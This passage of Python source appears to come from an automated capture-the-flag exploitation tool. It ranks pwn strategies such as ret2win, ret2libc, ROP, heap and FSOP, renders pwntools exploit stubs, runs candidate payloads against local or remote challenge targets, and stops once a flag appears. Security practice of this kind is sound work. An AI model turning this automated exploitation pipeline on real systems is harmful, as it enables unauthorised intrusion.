                if symbol and address:
                    add_hint("{0}={1}".format(symbol, address))
                add_hint(item.get("raw"))
                add_hint("leak_symbol={0}".format(item.get("leak_symbol", "")))
                add_hint("leak_got={0}".format(item.get("leak_got", "")))
            else:
                add_hint(item)
        return hints[:12]

    def _prepare_pwn_remote_debug_helpers(self, binary_path, artifact_root, remote_context):
        helpers = []
        pwn_capabilities = dict(remote_context.get("pwn_capabilities") or {})
        if not pwn_capabilities.get("gdbserver") or not self.remote_tool:
            return helpers
        rendered = self.remote_tool.render_template(
            "pwn-gdbserver-launch",
            sample_path=remote_context.get("binary_path", ""),
            listen_port=31337,
            program_args=[],
        )
        if rendered.get("status") != "ok":
            return helpers
        helper_path = artifact_root / "{0}_{1}_pwn_gdbserver_launch.py".format(binary_path.stem, remote_context.get("host", "remote"))
        self.file_tool.write_text(helper_path, rendered.get("content", ""))
        helpers.append(
            {
                "name": "remote-gdbserver-launch",
                "launcher_path": str(helper_path),
                "notes_path": "",
                "command_preview": "python {0} {1} 31337 []".format(
                    helper_path.name,
                    remote_context.get("binary_path", ""),
                ),
            }
        )
        return helpers

    def _find_support_attachment(self, attachments, attachment_type="", skip_path=None):
        skip_marker = str(Path(skip_path).resolve()).lower() if skip_path else ""
        for item in list(attachments or []):
            path = Path(item)
            try:
                marker = str(path.resolve()).lower()
            except Exception:
                marker = str(path).lower()
            if skip_marker and marker == skip_marker:
                continue
            name = path.name.lower()
            if attachment_type == "libc":
                if "libc" in name or name.endswith(".so.6") or (name.endswith(".so") and not name.startswith("ld-")):
                    return path
            if attachment_type == "ld":
                if name.startswith("ld-") or "ld-linux" in name or "ld-musl" in name or name == "ld.so":
                    return path
        return None

    def _upload_remote_support_attachment(self, remote_context, local_path, artifact_root, memory, stem):
        local_path = Path(local_path)
        remote_workspace = dict(remote_context.get("workspace") or {})
        remote_input_dir = str(remote_workspace.get("input_dir") or remote_workspace.get("workspace_root") or "/tmp").rstrip("/")
        remote_path = "{0}/{1}".format(remote_input_dir, local_path.name)
        result = self.remote_tool.upload(remote_context.get("host", ""), local_path, remote_path=remote_path, timeout=45)
        artifact = artifact_root / "{0}_{1}_{2}_remote_upload.json".format(
            stem,
            remote_context.get("host", "remote"),
            local_path.stem,
        )
        self.file_tool.write_json(artifact, result)
        memory.record_action(
            "extract",
            "upload support file {0}".format(local_path.name),
            result.get("status", "error"),
            result.get("message", "") or "remote support upload",
            str(artifact),
        )
        if result.get("status") != "ok":
            return ""
        return str(result.get("remote_path") or "")

    def _should_use_qemu_lane(self, protections, pwn_probe):
        protections = dict(protections or {})
        pwn_probe = dict(pwn_probe or {})
        arch = str(protections.get("arch") or pwn_probe.get("arch") or "").strip().lower()
        if arch in {"", "elf", "pe", "x86", "x86_64", "amd64", "i386"}:
            return False
        return True

    def _build_exploit_plans(
        self,
        challenge,
        memory,
        category,
        classification,
        protections,
        interesting_symbols,
        candidate_inputs,
        remote_context,
        artifact_root=None,
        selected_analyzer=None,
        pwn_probe=None,
        angr_probe=None,
        pwn_family_info=None,
    ):
        subtype = classification["subtype"]
        analyzer_name = str((selected_analyzer or {}).get("analyzer_name", "") or "").lower()
        analyzer_lane = str((selected_analyzer or {}).get("lane", "") or "").lower()
        remote_templates = []
        pwn_probe = dict(pwn_probe or {})
        angr_probe = dict(angr_probe or {})
        pwn_family_info = dict(pwn_family_info or {})
        pwn_capabilities = dict((remote_context or {}).get("pwn_capabilities") or {})
        if category == "pwn":
            probe_ret2win = list(pwn_probe.get("ret2win_symbols", []))
            probe_fmt = list(pwn_probe.get("fmt_clues", []))
            probe_rop = list(pwn_probe.get("rop_hints", []))
            raw_payloads = list(pwn_probe.get("raw_payloads", []))
            ret2libc_plans = list(pwn_probe.get("ret2libc_plans", []))
            family = str(pwn_family_info.get("family") or "").strip().lower()
            rop_raw_payloads = [item for item in raw_payloads if str(item.get("kind") or "").startswith("rop")]
            rop_call_payloads = [item for item in raw_payloads if str(item.get("kind") or "") == "rop-call"]
            angr_inputs = [str(item or "").strip() for item in list(angr_probe.get("candidate_inputs", [])) if str(item or "").strip()]
            angr_outputs = [str(item or "").strip() for item in list(angr_probe.get("candidate_outputs", [])) if str(item or "").strip()]
            preferred_symbol = str((probe_ret2win or [""])[0] or "")
            plans = [
                ("ret2win / obvious win", "ret2win", 0.96 if subtype == "ret2win" else 0.58),
                ("format-string leak/write", "format-string", 0.92 if subtype == "format-string" else 0.56),
                ("stack overwrite", "stack-overflow", 0.86 if subtype == "stack-overflow" else 0.54),
                ("ROP skeleton", "rop", 0.8 if subtype == "rop" else 0.5),
                ("shellcode / heap", "shellcode", 0.76 if subtype in {"shellcode", "heap-hint"} else 0.46),
            ]
            if raw_payloads:
                memory.add_exploit_plan(
                    title="ret2win raw payload",
                    method="ret2win-raw",
                    url=challenge.target or str(challenge.attachments[0]) if challenge.attachments else "",
                    data={
                        "raw_payloads": raw_payloads[:4],
                        "candidate_inputs": [item.get("value", "") for item in candidate_inputs[:6]],
                        "protections": protections,
                        "selected_analyzer": dict(selected_analyzer or {}),
                    },
                    notes=self._plan_notes("ret2win raw payload", subtype, interesting_symbols, candidate_inputs)
                    + "\nraw_payloads={0}".format(", ".join(str(item.get("label") or "") for item in raw_payloads[:4])),
                    confidence=0.989 if subtype == "ret2win" else 0.93,
                )
            if ret2libc_plans:
                memory.add_exploit_plan(
                    title="ret2libc / leak + resolve",
                    method="ret2libc",
                    url=challenge.target or str(challenge.attachments[0]) if challenge.attachments else "",
                    data={
                        "ret2libc_plans": ret2libc_plans[:4],
                        "candidate_inputs": [item.get("value", "") for item in candidate_inputs[:8]],
                        "protections": protections,
                        "selected_analyzer": dict(selected_analyzer or {}),
                    },
                    notes=self._plan_notes("ret2libc / leak + resolve", subtype, interesting_symbols, candidate_inputs)
                    + "\nret2libc_plans={0}".format(", ".join(str(item.get("label") or "") for item in ret2libc_plans[:4])),
                    confidence=0.997 if subtype in {"rop", "stack-overflow"} else 0.982,
                )
            if rop_raw_payloads:
                memory.add_exploit_plan(
                    title="ROP raw payload",
                    method="rop-raw",
                    url=challenge.target or str(challenge.attachments[0]) if challenge.attachments else "",
                    data={
                        "raw_payloads": rop_raw_payloads[:4],
                        "candidate_inputs": [item.get("value", "") for item in candidate_inputs[:8]],
                        "protections": protections,
                        "selected_analyzer": dict(selected_analyzer or {}),
                    },
                    notes=self._plan_notes("ROP raw payload", subtype, interesting_symbols, candidate_inputs)
                    + "\nrop_payloads={0}".format(", ".join(str(item.get("label") or "") for item in rop_raw_payloads[:4])),
                    confidence=0.996 if subtype == "rop" else 0.972,
                )
            if rop_call_payloads:
                memory.add_exploit_plan(
                    title="ROP imported call",
                    method="rop-call",
                    url=challenge.target or str(challenge.attachments[0]) if challenge.attachments else "",
                    data={
                        "raw_payloads": rop_call_payloads[:4],
                        "candidate_inputs": [item.get("value", "") for item in candidate_inputs[:8]],
                        "protections": protections,
                        "selected_analyzer": dict(selected_analyzer or {}),
                    },
                    notes=self._plan_notes("ROP imported call", subtype, interesting_symbols, candidate_inputs)
                    + "\nrop_call_payloads={0}".format(", ".join(str(item.get("label") or "") for item in rop_call_payloads[:4])),
                    confidence=0.997 if subtype == "rop" else 0.978,
                )
            if bool(angr_probe.get("solved")) and angr_inputs:
                symbolic_confidence = 0.985
                if subtype == "stack-overflow":
                    symbolic_confidence = 0.992
                memory.add_exploit_plan(
                    title="symbolic input recovery",
                    method="symbolic-input",
                    url=challenge.target or str(challenge.attachments[0]) if challenge.attachments else "",
                    data={
                        "candidate_inputs": angr_inputs[:4],
                        "candidate_outputs": angr_outputs[:2],
                        "protections": protections,
                        "selected_analyzer": dict(selected_analyzer or {}),
                        "angr_probe": {
                            "candidate_inputs": angr_inputs[:4],
                            "candidate_outputs": angr_outputs[:2],
                            "solved": True,
                        },
                    },
                    notes=self._plan_notes("symbolic input recovery", subtype, interesting_symbols, candidate_inputs)
                    + "\nangr_inputs={0}".format(", ".join(angr_inputs[:4])),
                    confidence=symbolic_confidence,
                )
            if remote_context:
                remote_templates.extend(list(pwn_capabilities.get("recommended_templates") or []))
                hard_template_map = {
                    "seccomp-orw": "orw-pwntools-probe",
                    "sandbox-orw": "orw-pwntools-probe",
                    "shellcode-mmap": "orw-pwntools-probe",
                    "srop": "srop-pwntools-probe",
                    "ret2dlresolve": "ret2dlresolve-pwntools-probe",
                    "heap-uaf": "heap-pwntools-skeleton",
                    "heap-double-free": "heap-pwntools-skeleton",
                    "heap-tcache-poison": "heap-pwntools-skeleton",
                    "heap-unsorted-bin": "heap-pwntools-skeleton",
                    "fsop": "fsop-pwntools-skeleton",
                }
                hard_template = hard_template_map.get(family, "")
                if hard_template:
                    remote_templates.append(hard_template)
                pwntools_stub = self.remote_tool.render_template(
                    "pwntools-probe",
                    sample_path=remote_context["binary_path"],
                    binary_name=Path(remote_context["binary_path"]).name,
                    target_host=self._parse_host_port(challenge.target or "")[0],
                    target_port=self._parse_host_port(challenge.target or "")[1],
                    candidate_inputs=[item.get("value", "") for item in candidate_inputs[:8]],
                    target_symbol=preferred_symbol,
                    rop_hints=probe_rop[:8],
                    probe_summary={
                        "angr_candidate_inputs": angr_inputs[:4],
                        "angr_candidate_outputs": angr_outputs[:2],
                        "angr_solved": bool(angr_probe.get("solved")),
                        "ret2win_symbols": probe_ret2win[:8],
                        "ret2win_targets": list(pwn_probe.get("ret2win_targets", []))[:6],
                        "fmt_clues": probe_fmt[:8],
                        "raw_payloads": raw_payloads[:6],
                        "ret2libc_plans": ret2libc_plans[:4],
                        "tool_status": dict(pwn_probe.get("tool_status") or {}),
                    },
                )
                if pwntools_stub.get("status") == "ok" and artifact_root:
                    stub_artifact = Path(artifact_root) / "{0}_pwntools_probe.py".format(Path(remote_context["binary_path"]).stem)
                    self.file_tool.write_text(stub_artifact, pwntools_stub.get("content", ""))
            if family in {"seccomp-orw", "sandbox-orw", "shellcode-mmap", "srop", "ret2dlresolve", "heap-uaf", "heap-double-free", "heap-tcache-poison", "heap-unsorted-bin", "fsop"}:
                memory.add_exploit_plan(
                    title="hard-pwn {0}".format(family),
                    method=family,
                    url=challenge.target or str(challenge.attachments[0]) if challenge.attachments else "",
                    data={
                        "family": family,
                        "confidence": float(pwn_family_info.get("confidence", 0.0) or 0.0),
                        "family_evidence": list(pwn_family_info.get("evidence") or [])[:6],
                        "blockers": list(pwn_family_info.get("blockers") or [])[:4],
                        "candidate_inputs": [item.get("value", "") for item in candidate_inputs[:6]],
                        "protections": protections,
                    },
                    notes=self._plan_notes("hard-pwn {0}".format(family), subtype, interesting_symbols, candidate_inputs)
                    + "\nfamily={0}\nfamily_evidence={1}".format(
                        family,
                        ", ".join(
                            "{0}:{1}".format(str(item.get("source") or ""), str(item.get("value") or ""))
                            for item in list(pwn_family_info.get("evidence") or [])[:4]
                        ),
                    ),
                    confidence=max(0.72, float(pwn_family_info.get("confidence", 0.0) or 0.0)),
                )
            for title, method, confidence in plans:
                confidence = self._adjust_plan_confidence(category, method, confidence, subtype, selected_analyzer, candidate_inputs, interesting_symbols)
                if angr_inputs:
                    if method == "stack-overflow":
                        confidence = round(min(confidence + 0.18, 0.99), 4)
                    elif method in {"ret2win", "format-string"}:
                        confidence = round(max(confidence - 0.05, 0.0), 4)
                if method == "ret2win" and probe_ret2win:
                    confidence = round(min(confidence + 0.12, 0.99), 4)
                elif method == "format-string" and probe_fmt:
                    confidence = round(min(confidence + 0.1, 0.99), 4)
                elif method == "rop" and probe_rop:
                    confidence = round(min(confidence + 0.08, 0.99), 4)
                memory.add_exploit_plan(
                    title=title,
                    method=method,
                    url=challenge.target or str(challenge.attachments[0]) if challenge.attachments else "",
                    data={
                        "candidate_inputs": [item["value"] for item in candidate_inputs[:6]],
                        "protections": protections,
                        "selected_analyzer": dict(selected_analyzer or {}),
                        "pwn_probe": {
                            "ret2win_symbols": probe_ret2win[:8],
                            "ret2win_targets": list(pwn_probe.get("ret2win_targets", []))[:6],
                            "fmt_clues": probe_fmt[:8],
                            "rop_hints": probe_rop[:8],
                            "raw_payloads": raw_payloads[:6],
                            "ret2libc_plans": ret2libc_plans[:4],
                        },
                        "angr_probe": {
                            "candidate_inputs": angr_inputs[:4],
                            "candidate_outputs": angr_outputs[:2],
                            "solved": bool(angr_probe.get("solved")),
                        },
                    },
                    notes=self._plan_notes(title, subtype, interesting_symbols, candidate_inputs),
                    confidence=confidence,
                )
        else:
            plans = [
                ("direct constant/string recovery", "string-check", 0.95 if subtype == "string-check" else 0.58),
                ("lightweight xor/rot recovery", "xor-transform", 0.9 if subtype in {"xor-transform", "rot-or-table"} else 0.56),
                ("input reconstruction", "argv-check", 0.86 if subtype == "argv-check" else 0.52),
                ("patch/bypass suggestion", "patch-bypass", 0.8 if subtype == "patch-bypass" else 0.46),
                ("vm-lite/state-machine path", "vm-lite", 0.74 if subtype == "vm-lite" else 0.42),
            ]
            if remote_context:
                remote_templates.extend(["binary-checksec", "reverse-runner"])
            for title, method, confidence in plans:
                confidence = self._adjust_plan_confidence(category, method, confidence, subtype, selected_analyzer, candidate_inputs, interesting_symbols)
                memory.add_exploit_plan(
                    title=title,
                    method=method,
                    url=str(challenge.attachments[0]) if challenge.attachments else "",
                    data={
                        "candidate_inputs": [item["value"] for item in candidate_inputs[:8]],
                        "protections": protections,
                        "selected_analyzer": dict(selected_analyzer or {}),
                    },
                    notes=self._plan_notes(title, subtype, interesting_symbols, candidate_inputs),
                    confidence=confidence,
                )
        deduped_remote_templates = []
        for item in remote_templates:
            if item not in deduped_remote_templates:
                deduped_remote_templates.append(item)
        return {"recommended_remote_templates": deduped_remote_templates}

    def _adjust_plan_confidence(self, category, method, confidence, subtype, selected_analyzer, candidate_inputs, interesting_symbols):
        analyzer_name = str((selected_analyzer or {}).get("analyzer_name", "") or "").lower()
        analyzer_lane = str((selected_analyzer or {}).get("lane", "") or "").lower()
        candidate_values = [str(item.get("value", "") or "").lower() for item in list(candidate_inputs or [])[:8]]
        symbol_blob = "\n".join(str(item or "").lower() for item in list(interesting_symbols or [])[:12])
        boosted = float(confidence)
        if category == "pwn":
            if analyzer_name == "radare2":
                if method == subtype:
                    boosted += 0.08
                if method == "ret2win" and any(token in symbol_blob for token in ["win", "flag", "ret2win", "print_flag", "get_flag"]):
                    boosted += 0.06
                if method == "format-string" and any(token in value for value in candidate_values for token in ["%p", "%s", "%n"]):
                    boosted += 0.05
                if method == "stack-overflow" and any(len(value) >= 64 and set(value) == {"a"} for value in candidate_values):
                    boosted += 0.04
            elif analyzer_lane == "sidecar" and method in {"shellcode", "rop"}:
                boosted += 0.03
        else:
            if analyzer_lane == "sidecar":
                if method == subtype:
                    boosted += 0.08
                if method in {"string-check", "xor-transform", "vm-lite"} and any(
                    token in symbol_blob for token in ["flag", "correct", "wrong", "xor", "opcode", "vm", "decode", "patch"]
                ):
                    boosted += 0.05
            elif analyzer_name == "strings" and method == "string-check":
                boosted += 0.03
        return round(max(0.0, min(boosted, 0.99)), 4)

    def _plan_notes(self, title, subtype, interesting_symbols, candidate_inputs):
        parts = ["subtype={0}".format(subtype)]
        if interesting_symbols:
            parts.append("symbols={0}".format(" | ".join(interesting_symbols[:6])))
        if candidate_inputs:
            parts.append("inputs={0}".format(", ".join(item["value"] for item in candidate_inputs[:5])))
        parts.append("plan={0}".format(title))
        return "\n".join(parts)

    def _attempt_paths(
        self,
        challenge,
        binary_path,
        category,
        subtype,
        candidate_inputs,
        remote_context,
        artifact_root,
        memory,
        label="attempt",
        selected_analyzer=None,
        selected_debugger=None,
        pwn_probe=None,
        angr_probe=None,
    ):
        reports = []
        input_values = self._prioritize_attempt_inputs(category, subtype, candidate_inputs, selected_analyzer=selected_analyzer)
        attempt_order = self._select_attempt_order(challenge, category, selected_analyzer, remote_context)
        pwn_probe = dict(pwn_probe or {})
        angr_probe = dict(angr_probe or {})
        for lane in attempt_order:
            if lane == "local":
                local_report = self._run_local_candidate_inputs(
                    binary_path,
                    input_values,
                    artifact_root,
                    label,
                    memory,
                    category=category,
                    subtype=subtype,
                    selected_analyzer=selected_analyzer,
                    selected_debugger=selected_debugger,
                )
                if local_report:
                    reports.append(local_report)
                    self._collect_flags_from_attempt_report(local_report, memory, subtype)
                    if self._report_has_flag(local_report):
                        memory.record_action("attempt", "{0} stop after local".format(label), "ok", "validated local flag found; skipped remaining attempt lanes")
                        break
            elif lane == "remote" and remote_context:
                template_kind = "input-bruteforce-lite" if category == "pwn" else "reverse-runner"
                remote_report = self._run_remote_template(
                    remote_context,
                    template_kind,
                    artifact_root,
                    binary_path.stem,
                    memory,
                    sample_path=remote_context["binary_path"],
                    binary_name=binary_path.name,
                    candidate_inputs=input_values,
                    target_symbol=str((list(pwn_probe.get("ret2win_symbols", [])) or [""])[0] or ""),
                    rop_hints=list(pwn_probe.get("rop_hints", []))[:8],
                    probe_summary={
                        "angr_candidate_inputs": [str(item or "").strip() for item in list(angr_probe.get("candidate_inputs", [])) if str(item or "").strip()][:4],
                        "angr_candidate_outputs": [str(item or "").strip() for item in list(angr_probe.get("candidate_outputs", [])) if str(item or "").strip()][:2],
                        "angr_solved": bool(angr_probe.get("solved")),
                        "ret2win_symbols": list(pwn_probe.get("ret2win_symbols", []))[:8],
                        "ret2win_targets": list(pwn_probe.get("ret2win_targets", []))[:6],
                        "fmt_clues": list(pwn_probe.get("fmt_clues", []))[:8],
                        "interesting_strings": list(pwn_probe.get("interesting_strings", []))[:8],
                        "raw_payloads": list(pwn_probe.get("raw_payloads", []))[:6],
                        "ret2libc_plans": list(pwn_probe.get("ret2libc_plans", []))[:4],
                        "tool_status": dict(pwn_probe.get("tool_status") or {}),
                    },
                )
                if remote_report:
                    reports.append(remote_report)
                    self._collect_flags_from_attempt_report(remote_report, memory, subtype)
                    if self._report_has_flag(remote_report):
                        memory.record_action("attempt", "{0} stop after remote".format(label), "ok", "validated remote flag found; skipped remaining attempt lanes")
                        break
        return reports

    def _run_pwn_hard_lanes(self, challenge, binary_path, artifact_root, remote_context, memory, binary_context, pwn_probe=None):
        if not remote_context or not self.remote_tool:
            return []
        lane_specs = self._build_pwn_hard_lane_specs(challenge, binary_context)
        if not lane_specs:
            return []
        reports = []
        target_host, target_port = self._parse_host_port(challenge.target or "")
        probe_summary = {
            "pwn_family": str(binary_context.get("pwn_family") or ""),
            "pwn_family_evidence": list(binary_context.get("pwn_family_evidence", []))[:8],
            "pwn_family_candidates": list(binary_context.get("pwn_family_candidates", []))[:5],
            "protections": dict(binary_context.get("protections") or {}),
            "ret2win_symbols": list((pwn_probe or {}).get("ret2win_symbols", []))[:8],
            "ret2win_targets": list((pwn_probe or {}).get("ret2win_targets", []))[:6],
            "fmt_clues": list((pwn_probe or {}).get("fmt_clues", []))[:8],
            "interesting_strings": list((pwn_probe or {}).get("interesting_strings", []))[:10],
            "raw_payloads": list((pwn_probe or {}).get("raw_payloads", []))[:6],
            "ret2libc_plans": list((pwn_probe or {}).get("ret2libc_plans", []))[:4],
            "functions": list((pwn_probe or {}).get("functions", []))[:24],
            "imports": list((pwn_probe or {}).get("imports", []))[:24],
            "stage_status": dict(binary_context.get("pwn_stage_status") or {}),
        }
        recommended_templates = list(binary_context.get("recommended_remote_templates", []))
        for spec in lane_specs:
            template_kind = str(spec.get("template_kind") or "")
            if template_kind and template_kind not in recommended_templates:
                recommended_templates.append(template_kind)
            report = self._run_remote_template(
                remote_context,
                template_kind,
                artifact_root,
                binary_path.stem,
                memory,
                sample_path=remote_context.get("binary_path", ""),
                binary_name=binary_path.name,
                target_host=target_host,
                target_port=target_port,
                family_name=str(spec.get("family") or ""),
                protections=dict(binary_context.get("protections") or {}),
                probe_summary=probe_summary,
                candidate_inputs=[item.get("value", "") for item in list(binary_context.get("candidate_inputs", []))[:8]],
            )
            report["lane"] = str(spec.get("lane") or "")
            report["family"] = str(spec.get("family") or "")
            report["lane_summary"] = str(spec.get("summary") or "")
            payload = dict(report.get("payload") or {})
            artifact_paths = {}
            stub_path = self._persist_pwn_hard_stub_artifact(
                artifact_root,
                binary_path.stem,
                report["lane"],
                payload.get("exploit_stub") or payload.get("skeleton"),
            )
            if stub_path:
                artifact_paths["exploit_stub"] = stub_path
                binary_context["exploit_stub_generated"] = True
            report["artifact_paths"] = artifact_paths
            self._collect_flags_from_attempt_report(report, memory, report["family"] or binary_context.get("subtype", "pwn"))
            self._merge_pwn_stage_from_payload(binary_context, payload, report)
            reports.append(report)
            if self._should_stop_pwn_hard_lane(report):
                memory.record_action(
                    "attempt",
                    "{0} hard lane stop".format(report["lane"] or template_kind),
                    "ok",
                    "bounded hard-pwn lane produced the best available direction",
                )
                break
        binary_context["recommended_remote_templates"] = recommended_templates
        return reports

    def _build_pwn_hard_lane_specs(self, challenge, binary_context):
        family = str(binary_context.get("pwn_family") or "").strip().lower()
        candidates = [dict(item) for item in list(binary_context.get("pwn_family_candidates") or []) if isinstance(item, dict)]
        hard_map = {
            "heap-uaf": ("heap-primitive-probe", "heap-pwntools-skeleton", "bounded heap primitive probe"),
            "heap-double-free": ("heap-primitive-probe", "heap-pwntools-skeleton", "bounded heap primitive probe"),
            "heap-tcache-poison": ("heap-primitive-probe", "heap-pwntools-skeleton", "bounded heap primitive probe"),
            "heap-unsorted-bin": ("heap-primitive-probe", "heap-pwntools-skeleton", "bounded heap primitive probe"),
            "seccomp-orw": ("seccomp-orw-probe", "orw-pwntools-probe", "bounded ORW/seccomp probe"),
            "sandbox-orw": ("seccomp-orw-probe", "orw-pwntools-probe", "bounded sandbox ORW probe"),
            "shellcode-mmap": ("seccomp-orw-probe", "orw-pwntools-probe", "bounded mmap/shellcode probe"),
            "srop": ("srop-probe", "srop-pwntools-probe", "bounded SROP probe"),
            "fsop": ("fsop-probe", "fsop-pwntools-skeleton", "bounded FSOP probe"),
            "ret2dlresolve": ("ret2dlresolve-probe", "ret2dlresolve-pwntools-probe", "bounded ret2dlresolve probe"),
        }
        metadata = dict(challenge.metadata or {})
        speed_mode = str(metadata.get("speed_mode") or ((metadata.get("autopilot_plan") or {}).get("speed_mode")) or "standard").strip().lower()
        fastest_limit = 2 if speed_mode == "fastest" else 4
        selected_families = []
        if family in hard_map:
            selected_families.append(family)
        for item in candidates:
            candidate_family = str(item.get("family") or "").strip().lower()
            confidence = float(item.get("confidence", 0.0) or 0.0)
            if candidate_family in hard_map and candidate_family not in selected_families and confidence >= 0.66:
                selected_families.append(candidate_family)
            if len(selected_families) >= fastest_limit:
                break
        specs = []
        seen_lanes = set()
        for candidate_family in selected_families[:fastest_limit]:
            lane, template_kind, summary = hard_map.get(candidate_family, ("", "", ""))
            if not lane or lane in seen_lanes:
                continue
            seen_lanes.add(lane)
            specs.append(
                {
                    "family": candidate_family,
                    "lane": lane,
                    "template_kind": template_kind,
                    "summary": summary,
                }
            )
        return specs

    def _persist_pwn_hard_stub_artifact(self, artifact_root, stem, lane, content):
        text = str(content or "").strip()
        if not text:
            return ""
        artifact = Path(artifact_root) / "{0}_{1}_exploit_stub.py".format(stem, str(lane or "hard-pwn").replace("-", "_"))
        self.file_tool.write_text(artifact, text + ("\n" if not text.endswith("\n") else ""))
        return str(artifact)

    def _merge_pwn_stage_from_payload(self, binary_context, payload, report):
        payload = dict(payload or {})
        report = dict(report or {})
        status = str(payload.get("stage_status") or "").strip().lower()
        if not status:
            if self._report_has_flag(report):
                status = "verified-flag"
            elif payload.get("transcript_preview") or payload.get("exploit_transcript"):
                status = "verified-transcript"
            elif payload.get("stage2_generated") or payload.get("stage2_payload"):
                status = "stage2-synthesized"
            elif payload.get("exploit_stub_generated") or payload.get("exploit_stub") or payload.get("skeleton"):
                status = "skeleton-generated"
            else:
                status = "classified-only"
        update = {
            "status": status,
            "family": str(payload.get("primary_family") or report.get("family") or binary_context.get("pwn_family") or ""),
            "source_lane": str(report.get("lane") or report.get("template_kind") or ""),
            "summary": str(payload.get("summary") or report.get("lane_summary") or ""),
            "constraints": list(payload.get("constraints") or []),
            "blockers": list(payload.get("blockers") or []),
            "leak_artifacts": list(payload.get("leak_artifacts") or []),
            "resolved_libc_context": dict(payload.get("resolved_libc_context") or {}),
            "stage1_payload": dict(payload.get("stage1_payload") or {}),
            "stage2_payload": dict(payload.get("stage2_payload") or {}),
            "exploit_transcript": dict(payload.get("exploit_transcript") or {}),
        }
        merged = self._merge_pwn_stage_status(binary_context.get("pwn_stage_status"), update)
        binary_context["pwn_stage_status"] = merged
        binary_context["leak_artifacts"] = list(merged.get("leak_artifacts") or [])
        binary_context["resolved_libc_context"] = dict(merged.get("resolved_libc_context") or {})
        binary_context["stage1_payload"] = dict(merged.get("stage1_payload") or {})
        binary_context["stage2_payload"] = dict(merged.get("stage2_payload") or {})
        binary_context["exploit_transcript"] = dict(merged.get("exploit_transcript") or {})
        if payload.get("exploit_stub_generated") or payload.get("exploit_stub") or payload.get("skeleton"):
            binary_context["exploit_stub_generated"] = True
        if payload.get("stage2_generated") or payload.get("stage2_payload"):
            binary_context["stage2_generated"] = True

    def _merge_pwn_stage_status(self, current, update):
        current = dict(current or {})
        update = dict(update or {})

        def rank(name):
            table = {
                "unknown": 0,
                "classified-only": 1,
                "skeleton-generated": 2,
                "stage1-ready": 3,
                "stage2-synthesized": 4,
                "verified-transcript": 5,
                "verified-flag": 6,
            }
            return table.get(str(name or "").strip().lower(), 0)

        def dedupe(values):
            items = []
            seen = set()
            for value in list(values or []):
                marker = str(value or "").strip().lower()
                if not marker or marker in seen:
                    continue
                seen.add(marker)
                items.append(str(value).strip())
            return items[:8]

        def merge_mapping(existing, incoming):
            merged_map = dict(existing or {})
            for key, value in dict(incoming or {}).items():
                if value in [None, "", [], {}]:
                    continue
                if isinstance(value, dict) and isinstance(merged_map.get(key), dict):
                    merged_map[key] = merge_mapping(merged_map.get(key), value)
                elif isinstance(value, list) and isinstance(merged_map.get(key), list):
                    merged_map[key] = dedupe(list(merged_map.get(key) or []) + list(value or []))
                else:
                    merged_map[key] = value
            return merged_map

        merged = dict(current)
        if rank(update.get("status")) >= rank(current.get("status")):
            for key in ["status", "family", "source_lane", "summary"]:
                if update.get(key) not in [None, ""]:
                    merged[key] = update.get(key)
        for key in ["constraints", "blockers"]:
            merged[key] = dedupe(list(current.get(key) or []) + list(update.get(key) or []))
        for key in ["leak_artifacts"]:
            if update.get(key):
                merged[key] = list(update.get(key) or [])
            else:
                merged.setdefault(key, list(current.get(key) or []))
        for key in ["resolved_libc_context", "stage1_payload", "stage2_payload", "exploit_transcript"]:
            if update.get(key):
                merged[key] = merge_mapping(current.get(key), update.get(key))
            else:
                merged.setdefault(key, dict(current.get(key) or {}))
        return merged

    def _should_stop_pwn_hard_lane(self, report):
        if self._report_has_flag(report):
            return True
        payload = dict((report or {}).get("payload") or {})
        stage_status = str(payload.get("stage_status") or "").strip().lower()
        if stage_status in {"verified-flag", "verified-transcript"}:
            return True
        if payload.get("transcript_preview") and (payload.get("stage2_generated") or payload.get("exploit_stub_generated")):
            return True
        return False

    def _select_attempt_order(self, challenge, category, selected_analyzer, remote_context):
        analyzer_name = str((selected_analyzer or {}).get("analyzer_name", "") or "").lower()
        analyzer_lane = str((selected_analyzer or {}).get("lane", "") or "").lower()
        has_remote = bool(remote_context)
        if category == "pwn":
            metadata = dict((challenge.metadata or {}))
            speed_mode = str(metadata.get("speed_mode") or ((metadata.get("autopilot_plan") or {}).get("speed_mode")) or "standard").strip().lower()
            speed_profile = dict(metadata.get("speed_profile") or ((metadata.get("autopilot_plan") or {}).get("speed_profile")) or {})
            if speed_mode == "fastest" and bool(speed_profile.get("pwn_remote_only", True)) and has_remote:
                return ["remote"]
            if has_remote and bool(self.policy.get("pwn_remote_first", True)):
                return ["remote", "local"]
            return ["local", "remote"] if has_remote else ["local"]
        if analyzer_lane == "sidecar" or analyzer_name == "ida-pro-mcp":
            return ["remote", "local"] if has_remote else ["local"]
        return ["local", "remote"] if has_remote else ["local"]

    def _report_has_flag(self, report):
        for attempt in list((report or {}).get("attempts", [])):
            if list(attempt.get("flags", []) or []):
                return True
            blob = "\n".join(
                [
                    str(attempt.get("stdout", "")),
                    str(attempt.get("stderr", "")),
                    str(attempt.get("stage2_stdout", "")),
                    str(attempt.get("stage2_stderr", "")),
                ]
            )
            if self.verifier.discover_from_text(blob):
                return True
        payload = dict((report or {}).get("payload") or {})
        if list(payload.get("candidate_flags", []) or []):
            return True
        return False

    def _prioritize_attempt_inputs(self, category, subtype, candidate_inputs, selected_analyzer=None):
        analyzer_name = str((selected_analyzer or {}).get("analyzer_name", "") or "").lower()
        analyzer_lane = str((selected_analyzer or {}).get("lane", "") or "").lower()

        def _priority(item):
            value = str(item.get("value", "") or "")
            source = str(item.get("source", "") or "").lower()
            confidence = float(item.get("confidence", 0.0) or 0.0)
            score = confidence
            if category == "pwn":
                if source == "remote-angr-probe":
                    score += 0.2
                if source == "remote-pwn-probe-raw":
                    score += 0.26
                if source == "remote-pwn-probe-ret2libc":
                    score += 0.3
                if source == subtype:
                    score += 0.25
                if analyzer_name == "radare2":
                    score += 0.08
                lowered = value.lower()
                if lowered.startswith("rawpayload:"):
                    score += 0.18
                if any(token in lowered for token in ["ret2win", "win", "%p", "%s", "%n", "/bin/sh"]):
                    score += 0.12
                if set(lowered) == {"a"} and len(lowered) >= 64:
                    score += 0.05
            else:
                if analyzer_lane == "sidecar":
                    if source in {"analyzer-hint", "analyzer-quoted", "base64", "hex", subtype}:
                        score += 0.18
                    if any(token in value.lower() for token in ["flag", "correct", "wrong", "secret", "open", "opcode", "xor"]):
                        score += 0.08
                elif source in {"base64", "hex"}:
                    score += 0.04
            return score

        ranked = sorted(list(candidate_inputs or []), key=_priority, reverse=True)
        values = []
        seen = set()
        for item in ranked[:12]:
            value = str(item.get("value", "") or "").strip()
            if not value:
                continue
            marker = value.lower()
            if marker in seen:
